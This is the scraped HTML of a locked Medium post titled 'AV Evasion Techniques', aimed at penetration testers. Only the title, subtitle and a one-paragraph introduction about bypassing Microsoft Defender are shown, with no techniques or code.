href="https://speechify.com/medium?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Text to speech</p></a></div><div class="rc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20240614-221838-3ba87a70fa"</script><script>window.__GRAPHQL_URI__ = "https://karol-mazurek.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-aa0742d806db","user-3f7ab05f0f68"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"updatedPostPreviewsEnabled":false,"lohpExperimentEnabled":"group_3","prideLogoEnabled":true},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":true,"routingEntity":{"type":"USER","id":"3f7ab05f0f68","explicit":true},"viewerIsBot":false},"debug":{"requestId":"7b9bfb0a-cbba-47a2-84ab-2b3f932fd37c","hybridDevServices":[],"originalSpanCarrier":{"ot-tracer-spanid":"2850eef1273f999d","ot-tracer-traceid":"6e7bf3e93e810d0e","ot-tracer-sampled":"true"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fkarol-mazurek.medium.com\u002Fav-evasion-techniques-aa0742d806db","host":"karol-mazurek.medium.com","hostname":"karol-mazurek.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20240614-221838-3ba87a70fa","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20240614-221838-3ba87a70fa","commit":"3ba87a70fa89456c9162015acb3c1797c92f4b41"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"1*OMF3fSqH8t4xBJ9-6oZDZw.png","height":106,"width":545},"postLogo":{"imageId":"1*kFrc4tBFM_tCis-2Ic87WA.png","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"isLoggedIn":false,"collectionByDomainOrSlug({\"domainOrSlug\":\"karol-mazurek.medium.com\"})":null,"postResult({\"id\":\"aa0742d806db\"})":{"__ref":"Post:aa0742d806db"}},"MastodonAccount:karmaz@infosec.exchange":{"__typename":"MastodonAccount","domain":"infosec.exchange","username":"karmaz","id":"karmaz@infosec.exchange"},"LinkedAccounts:3f7ab05f0f68":{"__typename":"LinkedAccounts","mastodon":{"__ref":"MastodonAccount:karmaz@infosec.exchange"},"id":"3f7ab05f0f68"},"UserViewerEdge:userId:3f7ab05f0f68-viewerId:lo_a48df742a8cf":{"__typename":"UserViewerEdge","id":"userId:3f7ab05f0f68-viewerId:lo_a48df742a8cf","isFollowing":false,"isUser":false,"isMuting":false},"NewsletterV3:e71c64288bc8":{"__typename":"NewsletterV3","id":"e71c64288bc8","type":"NEWSLETTER_TYPE_AUTHOR","slug":"3f7ab05f0f68","name":"3f7ab05f0f68","collection":null,"user":{"__ref":"User:3f7ab05f0f68"}},"User:3f7ab05f0f68":{"__typename":"User","id":"3f7ab05f0f68","name":"Karol Mazurek","username":"karol-mazurek","newsletterV3":{"__ref":"NewsletterV3:e71c64288bc8"},"linkedAccounts":{"__ref":"LinkedAccounts:3f7ab05f0f68"},"isSuspended":false,"imageId":"0*BLalJfMaz_JDj6fg","mediumMemberAt":0,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":1142},"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"karol-mazurek.medium.com"}},"hasSubdomain":true,"bio":"Offensive Security Engineer","isPartnerProgramEnrolled":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:3f7ab05f0f68-viewerId:lo_a48df742a8cf"},"viewerIsUser":false,"postSubscribeMembershipUpsellShownAt":0,"allowNotes":true,"membership":null,"twitterScreenName":""},"Paragraph:c36afdf0fd28_0":{"__typename":"Paragraph","id":"c36afdf0fd28_0","name":"d7e3","type":"H3","href":null,"layout":null,"metadata":null,"text":"AV EVASION TECHNIQUES","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c36afdf0fd28_1":{"__typename":"Paragraph","id":"c36afdf0fd28_1","name":"f2cb","type":"P","href":null,"layout":null,"metadata":null,"text":"How to fool the Microsoft Defender and other anti-virus systems.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*tI1sdO2GNSEBjEs9ZNL91w.jpeg":{"__typename":"ImageMetadata","id":"1*tI1sdO2GNSEBjEs9ZNL91w.jpeg","originalHeight":1152,"originalWidth":1920,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c36afdf0fd28_2":{"__typename":"Paragraph","id":"c36afdf0fd28_2","name":"6cfc","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*tI1sdO2GNSEBjEs9ZNL91w.jpeg"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c36afdf0fd28_3":{"__typename":"Paragraph","id":"c36afdf0fd28_3","name":"be90","type":"H3","href":null,"layout":null,"metadata":null,"text":"INTRODUCTION","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c36afdf0fd28_4":{"__typename":"Paragraph","id":"c36afdf0fd28_4","name":"a2bc","type":"P","href":null,"layout":null,"metadata":null,"text":"During the Penetration Testing, if you come across a Windows OS, in most cases it will be protected at least by the basic anti-virus system called \"Microsoft Defender\". In this article, you will learn how to bypass it and some of the other anti-viruses to avoid seeing the below message:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":53,"end":60,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":61,"end":63,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":148,"end":166,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Tag:cybersecurity":{"__typename":"Tag","id":"cybersecurity","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Tag:information-technology":{"__typename":"Tag","id":"information-technology","displayTitle":"Information Technology","normalizedTagSlug":"information-technology"},"Tag:information-security":{"__typename":"Tag","id":"information-security","displayTitle":"Information Security","normalizedTagSlug":"information-security"},"Tag:windows":{"__typename":"Tag","id":"windows","displayTitle":"Windows","normalizedTagSlug":"windows"},"Tag:malware":{"__typename":"Tag","id":"malware","displayTitle":"Malware","normalizedTagSlug":"malware"},"Post:aa0742d806db":{"__typename":"Post","id":"aa0742d806db","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":true,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":null,"startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:c36afdf0fd28_0"},{"__ref":"Paragraph:c36afdf0fd28_1"},{"__ref":"Paragraph:c36afdf0fd28_2"},{"__ref":"Paragraph:c36afdf0fd28_3"},{"__ref":"Paragraph:c36afdf0fd28_4"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:3f7ab05f0f68"},"inResponseToEntityType":null,"isLocked":true,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_UGC","mediumUrl":"https:\u002F\u002Fkarol-mazurek.medium.com\u002Fav-evasion-techniques-aa0742d806db","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"}],"isPublished":true,"latestPublishedVersion":"c36afdf0fd28","visibility":"LOCKED","postResponses":{"__typename":"PostResponses","count":2},"createdAt":1647521934043,"firstPublishedAt":1647621032961,"latestPublishedAt":1652804529781,"clapCount":28,"allowResponses":true,"isLimitedState":false,"title":"AV EVASION TECHNIQUES","isSeries":false,"sequence":null,"uniqueSlug":"av-evasion-techniques-aa0742d806db","socialTitle":"","socialDek":"","noIndex":null,"canonicalUrl":"","metaDescription":"","readingTime":10.350943396226414,"previewContent":{"__typename":"PreviewContent","subtitle":"How to fool the Microsoft Defender and other anti-virus systems."},"previewImage":{"__ref":"ImageMetadata:1*tI1sdO2GNSEBjEs9ZNL91w.jpeg"},"isShortform":false,"seoTitle":"","updatedAt":1690219382656,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:cybersecurity"},{"__ref":"Tag:information-technology"},{"__ref":"Tag:information-security"},{"__ref":"Tag:windows"},{"__ref":"Tag:malware"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":2213,"layerCake":0}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"MISS"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.3cc5e3b6.js"></script><script src="https://cdn-client.medium.com/lite/static/js/2640.3217006c.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.7db0aaff.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.4ddbf12e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.2021fe63.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4398.db4d4378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7883.0e445e04.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9281.e9be8bce.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7111.b294e9da.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6481.362dec70.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8695.6f58679b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8978.4b110123.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3418.eb013b5a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3894.e3d01e2c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5514.32e692f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5203.e7f058c5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7098.93054372.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8051.0a9d3f4b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8558.abbaadfd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1711.7605eb3e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8597.762eae49.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9174.b1b0f607.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8883.2f95bbf4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/705.e5898c57.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2911.d072adec.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8580.feeb2549.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6046.f9be485b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/500.d5389c14.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9408.22b56993.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6605.84e81b15.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6637.661bd7cf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7421.3f94f5ea.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/51.d8fb2684.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2133.c8ba56b1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.81dff084.chunk.js"></script><script>window.main();</script><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;894277f03a9bb335&quot;,&quot;version&quot;:&quot;2024.4.1&quot;,&quot;token&quot;:&quot;0b5f665943484354a59c39c6833f7078&quot;}" crossorigin="anonymous"></script>
<div><div class="rn n si sj qx sk sl sm sn so sp sq sr ss st ce bm su sv sw lh sx sy"><div class="bc b ds z sz"><div class="ab cm ta tb"><div class="l" role="alert">To make Medium work, we log user data. By using Medium, you agree to our <a class="af ag ah ai aj ak al am an ao ap tc td te" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9" rel="noopener follow" target="_blank">Privacy Policy</a>, including cookie policy.</div><div class="tf tg th ti tj tk l tl iz tm"><div class="l fg n tn"><button class="af ag ah ai aj ak al am an ao ap tc td to tp ab" data-testid="close-button" aria-label="close"><svg width="19" height="19" viewBox="0 0 19 19" class="em el"><path d="M13.8 4.6L9.5 8.89 5.21 4.6l-.61.61 4.29 4.3-4.29 4.28.61.62 4.3-4.3 4.28 4.3.62-.62-4.3-4.29 4.3-4.29" fill-rule="evenodd"></path></svg></button></div></div></div></div></div></div><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-4yr6e59344v3" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp&amp;co=aHR0cHM6Ly9rYXJvbC1tYXp1cmVrLm1lZGl1bS5jb206NDQz&amp;hl=pl&amp;v=TqxSU0dsOd2Q9IbI7CpFnJLD&amp;size=invisible&amp;cb=e0vubri698s2"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div></body></html>